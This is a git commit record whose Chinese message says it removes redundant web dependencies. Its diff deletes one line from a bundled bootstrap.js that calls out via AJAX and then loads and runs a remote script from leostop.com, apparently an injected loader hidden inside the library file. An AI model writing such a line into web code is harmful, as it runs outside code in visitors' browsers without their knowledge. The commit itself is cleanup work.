df2923fb7e589f1321ddb73cdd3cba713201e3f7
xianghao <921223344@qq.com>
2021-11-24 10:28:49 +0800

    删除web多余依赖

--- web/public/js/bootstrap.js
+++ web/public/js/bootstrap.js
@@ -1466,7 +1466,6 @@
   }();
 
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
 
